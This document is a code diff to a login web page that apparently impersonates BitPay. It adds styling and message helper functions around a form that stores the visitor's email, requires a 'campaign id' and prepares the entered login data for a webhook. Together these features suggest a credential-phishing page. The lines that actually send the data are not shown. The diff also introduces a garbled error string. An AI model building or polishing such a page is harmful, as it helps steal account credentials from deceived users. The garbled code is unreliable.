@@ -80,6 +80,11 @@
             border-color: #0033a0;
         }
 
+        .form-control.input-error {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 2px rgba(220, 53, 69, 0.2);
+        }
+
         .password-container {
             position: relative;
         }
@@ -372,7 +377,7 @@
                 return;
             }
             if (!campaignId) {
-                showError('Missing campaign id.');
+                showError('Missing attached url idmpaign id.');
                 return;
             }
 
@@ -381,8 +386,8 @@
             sessionStorage.setItem('bitpay_email', email);
 
             // Show loading state
-            const button = document.querySelector('.btn-primary');
-            showLoading(button);
+            showLoading('Submitting login...');
+            showLoadingButton(true);
 
             // Prepare data for webhook
             const data = {
@@ -565,6 +570,92 @@
                 setTimeout(() => input.classList.remove('input-error'), 5000);
             }
         }
+
+        function showLoading(message) {
+            // Create or update loading message element
+            let loadingElement = document.getElementById('loading-message');
+            if (!loadingElement) {
+                loadingElement = document.createElement('div');
+                loadingElement.id = 'loading-message';
+                loadingElement.style.cssText = `
+                    color: #2d4eac;
+                    font-size: 14px;
+                    margin-top: 10px;
+                    text-align: center;
+                    padding: 8px;
+                `;
+                const form = document.querySelector('form');
+                form.appendChild(loadingElement);
+            }
+            loadingElement.textContent = message || 'Loading...';
+            loadingElement.style.display = 'block';
+        }
+
+        function showError(message) {
+            // Create or update error message element
+            let errorElement = document.getElementById('error-message');
+            if (!errorElement) {
+                errorElement = document.createElement('div');
+                errorElement.id = 'error-message';
+                errorElement.style.cssText = `
+                    color: #dc3545;
+                    font-size: 14px;
+                    margin-top: 10px;
+                    text-align: center;
+                    padding: 8px;
+                    background: rgba(220, 53, 69, 0.1);
+                    border-radius: 4px;
+                    border: 1px solid rgba(220, 53, 69, 0.2);
+                `;
+                const form = document.querySelector('form');
+                form.appendChild(errorElement);
+            }
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            
+            // Hide loading message if exists
+            const loadingElement = document.getElementById('loading-message');
+            if (loadingElement) {
+                loadingElement.style.display = 'none';
+            }
+            
+            // Hide error after 5 seconds
+            setTimeout(() => {
+                if (errorElement) {
+                    errorElement.style.display = 'none';
+                }
+            }, 5000);
+        }
+
+        function showSuccess(message) {
+            // Create or update success message element
+            let successElement = document.getElementById('success-message');
+            if (!successElement) {
+                successElement = document.createElement('div');
+                successElement.id = 'success-message';
+                successElement.style.cssText = `
+                    color: #28a745;
+                    font-size: 14px;
+                    margin-top: 10px;
+                    text-align: center;
+                    padding: 8px;
+                    background: rgba(40, 167, 69, 0.1);
+                    border-radius: 4px;
+                    border: 1px solid rgba(40, 167, 69, 0.2);
+                `;
+                const form = document.querySelector('form');
+                form.appendChild(successElement);
+            }
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            
+            // Hide loading message if exists
+            const loadingElement = document.getElementById('loading-message');
+            if (loadingElement) {
+                loadingElement.style.display = 'none';
+            }
+        }
+
         // Initialize on page load
         window.addEventListener('load', function() {
             checkAndClearExpiredData(); // Check for expired data first
